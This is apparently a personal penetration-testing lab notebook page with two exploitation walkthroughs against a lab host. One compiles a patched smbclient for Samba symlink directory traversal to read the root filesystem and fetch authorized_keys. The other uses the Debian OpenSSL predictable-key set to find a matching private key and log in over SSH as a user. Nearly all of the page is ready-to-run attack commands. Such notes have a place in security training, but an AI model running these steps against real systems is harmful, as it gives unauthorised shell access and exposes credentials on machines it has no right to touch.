# Symlink and Debian OpenSSL Predictable PRNG

### Samba Exploit - Symlink for authorized\_keys

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># With samba 3.0.24 exploit - symlink, attacker can access to the directory outside the Samba root directory. 
</strong>
https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually 

# Kali 
wget https://download.samba.org/pub/samba/stable/samba-3.4.5.tar.gz
tar xvfz samba-3.4.5.tar.gz
cd samba-3.4.5/source3/client/
mv client.c client.c.bak
wget https://raw.githubusercontent.com/roughiz/Symlink-Directory-Traversal-smb-manually/master/client.c

# Compile
cd samba-3.4.5/source3
./configure --prefix=/home/iptracej/oscp/lab/10.11.1.136
make &#x26;&#x26; make install

# Configure and access to the share
export  LD_LIBRARY_PATH="$LD_LIBRARY_PATH:/home/iptracej/oscp/lab/10.11.1.136/lib"

# access to the share and rootfs
cd bin
./smbclient \\\\10.11.1.136\\'Bob Share' -u bob -N --option='client min protocol=NT1'
symlink / rootfs

# Find authorized key

# Get the keys
mget authorized_keys 

</code></pre>

### Debian OpenSSL Predictable PRNG

{% code overflow="wrap" %}
```bash
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
cd common_keys
tar jxf debian_ssh_rsa_2048_x86.tar.bz2

# Find a ssh key pair with the previous public key in authorized_keys file
grep -lr <public key>
# debian-ssh/common_keys/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858.pub

# Modify the authorized_keys file in victim machine

# connect to the victim machine via ssh 
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oPubkeyAcceptedKeyTypes=+ssh-dss -i debian-ssh/common_keys/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 bob@10.11.1.136
```
{% endcode %}



